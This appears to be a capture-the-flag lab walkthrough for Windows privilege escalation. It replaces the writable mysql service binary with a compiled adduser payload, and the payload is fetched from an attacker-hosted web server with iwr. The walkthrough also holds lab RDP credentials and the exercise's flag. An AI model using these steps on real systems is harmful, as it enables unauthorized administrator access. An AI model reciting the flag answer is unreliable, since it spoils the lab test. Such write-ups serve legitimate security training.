@@ -1,0 +1,59 @@
+Questions 1
+Follow the steps outlined in this section on CLIENTWK220 (VM #1) to replace the service binary of the service mysql. Enter the flag, which can be found on the desktop of user daveadmin.
+
+xfreerdp /u:dave /p:qwertqwertqwert123 /v:192.168.178.220
+
+# Get a list of all installed Windows services which are in the running state
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+...
+Apache2.4     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
+mysql   Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+...
+# Check if dave user able to perform write on both Path
+icacls "C:\xampp\apache\bin\httpd.exe"
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+...
+BUILTIN\Users:(F)
+...
+
+# Create payload
+nano adduser.c # Paste the code 
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+python3 -m http.server 80
+
+# Upload payload
+PS C:\Users\dave> iwr -uri http://192.168.45.208/adduser.exe -Outfile adduser.exe
+PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+PS C:\Users\dave> net stop mysql
+System error 5 has occurred.
+Access is denied.
+
+# Unfortunately dave dont have permission to stop the service.
+# Since we dont have permission lets check if the service Startup type is Auto then we can restart the OS to make the mysql restart on next Startup
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+Name  StartMode
+----  ---------
+mysql Auto
+
+# Restart service
+shutdown /r /t 0
+# We should always avoid the system reboot during pentest
+
+PS C:\Users\dave> net user
+...
+dave2
+...
+# User is created
+PS C:\Users\dave> Get-LocalGroupMember administrators
+...
+User        CLIENTWK220\dave2         Local
+...
+# Change to dave2 user
+start-process PowerShell -verb runas
+PS C:\Users\daveadmin\Desktop> type flag.txt
+OS{6ff326c682784876aaca13206eef94ea}
+
+
